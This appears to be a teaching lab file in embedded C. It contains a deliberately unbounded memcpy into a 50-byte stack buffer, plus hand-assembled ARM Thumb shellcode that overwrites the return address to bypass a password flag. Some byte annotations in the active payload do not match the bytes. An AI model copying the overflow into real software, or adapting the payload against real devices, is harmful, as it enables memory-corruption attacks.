#include <string.h>
#include "inc/hw_types.h"
#include "driverlib/debug.h"
#include "driverlib/sysctl.h"
#include "drivers/rit128x96x4.h"

volatile int gPasswordEntered = 0;

void addToHtml(const char *str)
{
  // Function to display string to user's web browser.
  // Just a stub since this is not important.
  ;
}

void printUserWelcome(const char *userName, unsigned userNameLength)
{
  char buf[50] = "Welcome to the web site, ";

  // EXTRA CREDIT: Why can't you use strcat() and omit
  // the userNameLength parameter?
  memcpy(buf+strlen(buf), userName, userNameLength);
  addToHtml(buf);

  // Indicate user needs to enter a password
  gPasswordEntered = 0;
}

void main(void)
{
  // Set the clocking to run directly from the crystal.
  SysCtlClockSet(SYSCTL_SYSDIV_1 | SYSCTL_USE_OSC | SYSCTL_OSC_MAIN |
		 SYSCTL_XTAL_8MHZ);

  // Initialize the OLED display.
  RIT128x96x4Init(1000000);

  /*
  // Implement malicious attack string
  printUserWelcome(
	"\xff"			//PAD BYTES				@0x200000cd
	"\x4f\xf0\x01\x00"	//mov  r0, #1		(0xf04f0001)	@0x200000ce-d1
	"\x40\xf2\x00\x11"	//movw r1, #256		(0xf2401100)	@0x200000d2-d5
	"\xc2\xf2\x00\x01"	//movt r1, #8192	(0xf2c20100)	@0x200000d6-d9
	"\x08\x70"		//strb r0, [r1, #0]	(0x7008)	@0x200000da-db
	"\x40\xf2\x93\x11"	//movw r1, #403		(0xf2401193)	@0x200000dc-df
	"\x08\x47"		//bx   r1		(0x4708)	@0x200000e0-e1
	"\xff\xff\xff\xff"	//PAD BYTES				@0x200000e2-e5
	"\xff\xff\xff\xff"	//PAD BYTES				@0x200000e6-e9
	"\xff\xff\xff\xff"	//PAD BYTES				@0x200000ea-ed
	"\xff\xff\xff\xff"	//PAD BYTES				@0x200000ee-f1
	"\xff\xff"		//PAD BYTES				@0x200000f2-f3
	"\xcf\x00\x00\x20"	//Address of inst.	(0x200000ce)	@0x200000f4-f7	
	, 43); 

  */

  /*
  // Implement malicious attack string
  printUserWelcome(
        "\xff\xff\xff"          //PAD BYTES                             @0x200000cd-cf
        "\x4f\xf0\x01\x00"      //mov  r0, #1           (0xf04f0001)    @0x200000d0-d3
        "\x40\xf2\x00\x11"      //movw r1, #256         (0xf2401100)    @0x200000d4-d7
        "\xc2\xf2\x00\x01"      //movt r1, #8192        (0xf2c20100)    @0x200000d8-db
        "\x08\x70"              //strb r0, [r1, #0]     (0x7008)        @0x200000dc-dd
        "\x40\xf2\x93\x11"      //movw r1, #403         (0xf2401193)    @0x200000de-e1
        "\x08\x47"              //bx   r1               (0x4708)        @0x200000e2-e3
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000e4-e7
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000e8-eb
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000ec-ef
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000f0-f3
        "\xd1\x00\x00\x20"      //Address of inst.      (0x200000d0)    @0x200000f4-f7
        , 43);
  */

  // Implement malicious attack string
  printUserWelcome(
        "\xff\xff\xff"          //PAD BYTES                             @0x200000cd-cf
        "\x4f\xf0\x01\x00"      //mov  r0, #1           (0xf04f0001)    @0x200000d0-d3
        "\x40\xf2\x00\x11"      //movw r1, #256         (0xf2401100)    @0x200000d4-d7
        "\xc2\xf2\x00\x01"      //movt r1, #8192        (0xf2c20100)    @0x200000d8-db
        "\x08\x60"              //str  r0, [r1, #0]     (0x6008)        @0x200000dc-dd
        "\x40\xf2\x93\x10"      //movw r0, #403         (0xf2401193)    @0x200000de-e1
        "\x00\x47"              //bx   r1               (0x4700)        @0x200000e2-e3
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000e4-e7
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000e8-eb
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000ec-ef
        "\xff\xff\xff\xff"      //PAD BYTES                             @0x200000f0-f3
        "\xd1\x00\x00\x20"      //Address of inst.      (0x200000d0)    @0x200000f4-f7
        , 43);
 
  if (gPasswordEntered) {
    RIT128x96x4StringDraw("Success!", 32, 24, 15);
  } else {
    RIT128x96x4StringDraw("Failure!", 32, 24, 15);
  }

  while (1) ;
}
